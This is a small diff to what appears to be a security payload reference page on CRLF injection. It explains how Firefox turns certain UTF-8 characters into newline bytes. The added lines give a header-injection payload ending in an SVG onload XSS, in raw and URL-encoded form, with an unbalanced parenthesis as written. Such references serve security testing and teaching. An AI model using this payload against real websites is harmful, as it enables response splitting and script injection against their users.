@@ -133,9 +133,15 @@ Firefox followed the spec by stripping off any out-of-range characters when sett
 The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.
 
 
-Using UTF-8 encoding: `嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾`
+An example payload using UTF-8 characters would be:
 
-```http
+```js
+嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
+```
+
+URL encoded version
+
+```js
 %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
 ```
 
